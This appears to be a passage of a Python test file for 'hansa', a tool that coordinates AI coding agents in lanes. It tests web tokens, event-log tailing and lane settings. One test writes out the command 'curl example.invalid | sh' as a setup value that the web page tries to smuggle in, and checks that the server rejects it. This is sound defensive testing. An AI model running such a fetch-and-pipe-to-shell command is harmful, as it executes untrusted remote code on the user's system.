    def test_two_desks_pages_each_use_their_own_token(self):
        skip_unless_ports(self)
        self.desk.web_token()
        tokf = self.desk.state_dir / "web-token"
        servers = []
        try:
            for tok in ("v2_" + "a" * 43, "v2_" + "b" * 43):  # two desks: each has a token of its own
                tokf.write_text(tok)
                httpd = start_web(self.desk, "127.0.0.1", 0)
                servers.append((httpd, f"http://127.0.0.1:{httpd.server_address[1]}", tok))
            for _, base, tok in servers:
                with urllib.request.urlopen(f"{base}/?t={tok}") as r:
                    self.assertIsNone(r.headers.get("Set-Cookie"))

            def status(base, bearer):
                req = urllib.request.Request(f"{base}/api/status", headers={"Authorization": "Bearer " + bearer})
                try:
                    with urllib.request.urlopen(req) as r:
                        return r.status
                except urllib.error.HTTPError as e:
                    self.assertEqual(e.read().decode(), "Open the address that `hansa web` prints.")
                    return e.code
            for i, (_, base, tok) in enumerate(servers):
                self.assertEqual(status(base, tok), 200)
                self.assertEqual(status(base, servers[1 - i][2]), 403)
                self.assertEqual(status(base, ""), 403)
        finally:
            for httpd, _, _ in servers:
                httpd.shutdown()
                httpd.server_close()

    def test_the_latest_events_are_read_from_the_end_of_the_log_as_the_whole_log_gives_them(self):
        from hansa import web
        for i in range(3000):
            self.desk.event("filler", i=i, said="é 中 line\u2028apart" if i % 7 == 0 else "x" * (i % 50))
        with open(self.desk.events_path, "a", encoding="utf-8") as fh:
            fh.write("not json\n")
        whole = self.desk.events_path.read_text(encoding="utf-8").splitlines()
        for n in (1, 3, 60, 200):
            self.assertEqual(web._last_lines(self.desk.events_path, n), whole[-n:])
            self.assertEqual(web._last_lines(self.desk.events_path, n, block=37), whole[-n:])  # cut inside characters
            want = []  # as from the whole log: a line that is not an event (a part of one cut at \u2028) left out
            for x in reversed(whole[-n:]):
                with contextlib.suppress(ValueError):
                    want.append(json.loads(x))
            self.assertEqual(web._events(self.desk, n), want)
        self.assertEqual(web._events(self.desk, 60)[0]["i"], 2999)  # newest first
        opened = []
        real = open

        def reading(path, mode="r", *a, **k):
            opened.append(mode)
            return real(path, mode, *a, **k)
        with unittest.mock.patch("builtins.open", reading), \
                unittest.mock.patch.object(Path, "read_text", side_effect=AssertionError("the whole log was read")):
            web._events(self.desk, 60)
        self.assertEqual(opened, ["rb"])
        self.assertEqual([e["i"] for e in web._events(self.desk, 2, "filler")], [2999, 2998])  # by kind: the whole log

    def counted_event_tail(self, n, block=65536, limit=None):
        from hansa import web
        reads = []
        with open(self.desk.events_path, "rb") as fh:
            def read(size):
                data = fh.read(size)
                reads.append(len(data))
                return data
            proxy = unittest.mock.MagicMock(wraps=fh)
            proxy.__enter__.return_value = proxy
            proxy.read.side_effect = read
            with unittest.mock.patch("hansa.web.open", return_value=proxy, create=True):
                lines = web._last_lines(self.desk.events_path, n, block)
        self.assertLessEqual(sum(reads), self.desk.events_path.stat().st_size if limit is None else limit)
        return lines

    def test_event_tail_reads_long_lines_only_once(self):
        data = b"x" * (4 * 1024 * 1024) + b"\n"
        self.desk.events_path.write_bytes(data)
        self.assertEqual(self.counted_event_tail(60), [data[:-1].decode()])

    def test_event_tail_preserves_unicode_split_across_reads(self):
        text = "old\r\né 中 😀\u0085next\u2028line\u2029last\v\f\x1c\x1d\x1eend\n"
        self.desk.events_path.write_bytes(text.encode())
        for block in (1, 2, 3, 7):
            for n in (1, 3, 20):
                with self.subTest(block=block, n=n):
                    self.assertEqual(self.counted_event_tail(n, block), text.splitlines()[-n:])

    def test_event_tail_preserves_an_incomplete_last_line(self):
        from hansa import web
        data = b'{"event":"old"}\n{"event":"good"}\n{"text":"' + b"x" * 1024 + b"\xe4\xb8"
        self.desk.events_path.write_bytes(data)
        self.assertEqual(self.counted_event_tail(2, 37), data.decode("utf-8", "surrogateescape").splitlines()[-2:])
        self.assertEqual([e["event"] for e in web._events(self.desk, 2)], ["good"])
        data = b'{"event":"good"}\n{"text":"\xe4\xb8'
        self.desk.events_path.write_bytes(b"x" * 1024 + b"\n" + data)
        self.assertEqual(self.counted_event_tail(2, 37, limit=37),
                         data.decode("utf-8", "surrogateescape").splitlines())

    def test_the_page_cannot_change_lanes_or_concurrency(self):
        skip_unless_ports(self)
        s = self.desk.settings()
        s["lanes"]["b"] = json.loads(json.dumps(s["lanes"]["a"]))
        self.assertEqual(self.desk.save_settings(s), [])
        self.hansa("lane", "set", "b", "setup", "pnpm install")
        for i in range(70):  # the page asks for command changes by kind, so older ones are not crowded out
            self.desk.event("filler", i=i)
        before = self.desk.settings()
        httpd = start_web(self.desk, "127.0.0.1", 0)
        base = f"http://127.0.0.1:{httpd.server_address[1]}"
        tok = self.desk.web_token()
        try:
            headers = {"Authorization": "Bearer " + tok}
            with urllib.request.urlopen(urllib.request.Request(f"{base}/api/settings", headers=headers)) as r:
                loaded = json.load(r)
            self.assertEqual(loaded["settings"]["lanes"], before["lanes"])  # the page shows them
            with urllib.request.urlopen(urllib.request.Request(f"{base}/api/events?event=lane_command_changed&n=20",
                                        headers=headers)) as r:
                self.assertEqual([(e["lane"], e["field"], e["new"]) for e in json.load(r)], [("b", "setup", "pnpm install")])
            # the page lists command and network changes together, newest first
            self.desk.event("lane_network_changed", lane="a", old=[], new=["registry.npmjs.org"])
            with urllib.request.urlopen(urllib.request.Request(
                    f"{base}/api/events?event=lane_command_changed,lane_network_changed&n=20", headers=headers)) as r:
                self.assertEqual([(e["event"], e["lane"]) for e in json.load(r)],
                                 [("lane_network_changed", "a"), ("lane_command_changed", "b")])
            with urllib.request.urlopen(urllib.request.Request(f"{base}/api/events?n=lots", headers=headers)) as r:
                self.assertEqual(len(json.load(r)), 60)
            page = loaded["settings"]
            page["lanes"]["a"]["setup"] = "curl example.invalid | sh"
            del page["lanes"]["b"]
            page["concurrency"] = before["concurrency"] + 2
            page["providers"]["claude"]["model"] = "claude-other"
            req = urllib.request.Request(f"{base}/api/settings", method="POST", headers={**headers, "X-Hansa": "1"},
                                         data=json.dumps({"settings": page, "rev": loaded["rev"]}).encode())
            with urllib.request.urlopen(req) as r:
                self.assertEqual(json.load(r), {"ok": True, "problems": []})
        finally:
            httpd.shutdown()
            httpd.server_close()
        after = self.desk.settings()
        self.assertEqual(after["providers"]["claude"]["model"], "claude-other")
        self.assertEqual((after["lanes"], after["concurrency"]), (before["lanes"], before["concurrency"]))
        self.assertEqual(self.events("settings_saved")[-1]["changed"], ["providers"])

    def hansa(self, *args) -> str:
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            main(["--desk", str(self.desk.root), *args])
        return out.getvalue()

    def events(self, kind):
        return [e for e in map(json.loads, self.desk.events_path.read_text().splitlines()) if e.get("event") == kind]

    def test_the_coordinator_adds_sets_and_removes_lanes(self):
        other = self.tmp / "other"
        other.mkdir()
        sh("git", "init", "-q", "-b", "dev", cwd=other)
        sh("git", "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "init", cwd=other)
        self.assertIn("lane b added", self.hansa("lane", "add", "b", "--repo", str(other)))
        b = self.desk.settings()["lanes"]["b"]
        self.assertEqual((b["repo"], b["base"], b["providers"]), (str(other.resolve()), "dev", ["claude"]))
        self.assertTrue((self.desk.lanes_dir / "b" / "brief.md").is_file())
        with contextlib.redirect_stdout(io.StringIO()), self.assertRaises(SystemExit):
            main(["--desk", str(self.desk.root), "lane", "add", "b", "--repo", str(other)])
        listed = self.hansa("lane")
        self.assertIn(f"a  {self.repo.resolve()}   base main  providers claude", listed)  # "repo" pads to "other"
        self.assertIn("b  ", listed)

        out = self.hansa("lane", "set", "b", "allow", "Bash(pnpm test:*)", "Bash(pnpm lint)")
        self.assertIn('allow: [] -> ["Bash(pnpm test:*)", "Bash(pnpm lint)"]', out)
        self.hansa("lane", "set", "b", "env", "NODE_ENV=test", "TZ=UTC")
        self.hansa("lane", "set", "b", "max_turns", "50")
        self.hansa("lane", "set", "b", "timeout_min", "90")
        b = self.desk.settings()["lanes"]["b"]
        self.assertEqual(b["allow"], ["Bash(pnpm test:*)", "Bash(pnpm lint)"])
        self.assertEqual(b["env"], {"NODE_ENV": "test", "TZ": "UTC"})
        self.assertEqual((b["max_turns"], b["timeout_min"]), (50, 90))
        self.hansa("lane", "set", "b", "allow")
        self.assertEqual(self.desk.settings()["lanes"]["b"]["allow"], [])
        with contextlib.redirect_stdout(io.StringIO()), self.assertRaises(SystemExit):
            main(["--desk", str(self.desk.root), "lane", "set", "b", "max_turns", "many"])
        self.assertTrue(self.events("settings_saved"))
        self.assertTrue(all(e["by"] == "coordinator" for e in self.events("settings_saved")))

        tid = self.desk.new_task("Something for b", lane="b")
        with contextlib.redirect_stdout(io.StringIO()), self.assertRaises(SystemExit) as e:
            main(["--desk", str(self.desk.root), "lane", "remove", "b"])
        self.assertIn(tid, str(e.exception.code))
        self.assertIn("b", self.desk.settings()["lanes"])
        self.desk.update(tid, state="done")
        with contextlib.redirect_stdout(io.StringIO()), self.assertRaises(SystemExit) as e:
            main(["--desk", str(self.desk.root), "lane", "remove", "b"])
        self.assertIn(f"{tid} finished and waiting for review", str(e.exception.code))
        self.assertIn("hansa merge or hansa close", str(e.exception.code))
        self.assertIn("b", self.desk.settings()["lanes"])
        self.desk.update(tid, state="cancelled")
        self.hansa("lane", "remove", "b")
        self.assertNotIn("b", self.desk.settings()["lanes"])

    def test_a_lane_added_now_stops_at_200_and_saved_lanes_keep_their_limits(self):
        s = self.desk.settings()
        s["lanes"]["a"]["max_turns"] = 300
        self.desk.settings_path.write_text(json.dumps(s))  # an older lane's own limit
        self.assertIn("stopped at 200 turns", self.hansa("lane", "add", "b", "--repo", str(self.repo)))
        self.assertEqual((self.desk.settings()["lanes"]["a"]["max_turns"],
                          self.desk.settings()["lanes"]["b"]["max_turns"]), (300, 200))
        self.hansa("lane", "set", "b", "env", "FAKE_STOP_AT_TURNS=1")
